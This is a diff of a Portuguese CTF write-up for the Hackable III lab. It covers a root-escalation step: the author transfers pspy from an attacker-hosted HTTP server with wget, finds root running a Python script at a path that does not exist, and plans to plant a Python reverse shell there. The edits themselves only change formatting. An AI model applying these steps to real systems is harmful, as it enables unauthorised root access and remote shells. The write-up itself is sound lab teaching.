@@ -70,19 +70,19 @@ acessando ela temos um arquivo chamada 1.txt, usando o hashanalyser(https://www.
 
 <h2>Após fazer login no usuário hackable_3 executaremos o [pspy](link_pspy) - periodicamente  o root(UID=0) executado "python3 /scripts/to_hackable_3.py", indo até a pasta não existe o arquivo, então basta criarmos um arquivo com o mesmo caminho que será executado pelo root</h2>
 
-'''
+<h4>
 atacante: python3 -m http.server
 vítima: wget http://ip_kali:8000/pspy
 	chmod +x
 	./pspy
-'''
+</h4>
 
 ![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/12.JPG)
 
 
 <h2>Agora é hora da criatividade, o root está executando nosso arquivo python, no nosso caso queremos conseguir uma reverse shell</h2>
 
-<h2>para o reverse shell usei o de python -> [seguinte](https://shellgenerator.github.io/) </h2>
+<h2>para o reverse shell, usei o de python <https://shellgenerator.github.io> </h2>
 
 ![img](https://raw.githubusercontent.com/elias403/Write-up-s/main/images/hackable_III/13.JPG)
 
